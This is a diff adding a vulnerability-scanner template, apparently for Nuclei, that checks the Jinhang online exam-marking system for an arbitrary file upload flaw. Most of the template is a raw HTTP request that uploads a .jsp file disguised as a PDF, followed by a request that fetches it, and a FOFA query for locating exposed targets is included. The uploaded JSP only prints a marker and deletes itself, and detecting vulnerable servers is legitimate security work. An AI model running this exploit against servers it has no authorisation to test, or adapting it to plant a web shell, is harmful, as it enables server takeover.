@@ -1,0 +1,54 @@
+id: jinhang-yuejuanxitong-fileupload
+
+info:
+  name: 金航网上阅卷系统fileUpload任意文件上传漏洞
+  author: qwtd
+  severity: critical
+  description: |-
+    衡水金航计算机科技有限公司是一家长期致力于图像标记识别采集技术及信息管理系统的软件企业。金航网上阅卷系统：可以广泛地应用于高考、中考、教育局组织的学校联考、各类学校自组织考试、各种行业考试、职称考试等。衡水金航计算机科技有限公司金航网上阅卷系统 fileUpload 任意文件上传漏洞，攻击者可通过该漏洞获取服务器权限。
+  reference:
+    - https://github.com/wy876/POC/blob/main/EDU/%E8%A1%A1%E6%B0%B4%E9%87%91%E8%88%AA/%E9%87%91%E8%88%AA%E7%BD%91%E4%B8%8A%E9%98%85%E5%8D%B7%E7%B3%BB%E7%BB%9FfileUpload%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    max-request: 1
+    fofa-query: body="js/insteadSelect/jquery.insteadSelect.css"
+    verified: true
+  tags: 金航网上阅卷系统
+
+http:
+  - raw:
+      - |
+        POST /fileUpload HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36
+        Content-Type: multipart/form-data; boundary=00content0boundary00
+        Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+        Content-Length: 351
+        Connection: close
+
+        --00content0boundary00
+        Content-Disposition: form-data; name="upload"; filename="{{randstr_1}}.jsp"
+        Content-Type: application/pdf
+
+        <% out.print("{{randstr_2}}");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+        --00content0boundary00
+        Content-Disposition: form-data; name="uploadContentType"
+
+        pdf
+        --00content0boundary00
+        Content-Disposition: form-data; name="uploadFileName"
+
+        1.jsp
+        --00content0boundary00--
+
+      - |
+        GET /upload/{{randstr_1}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_1 == 200"
+          - 'contains(body_1, "success\":true")'
+          - 'contains(body_2, "{{randstr_2}}")'
+          - "status_code_2 == 200"
+        condition: and
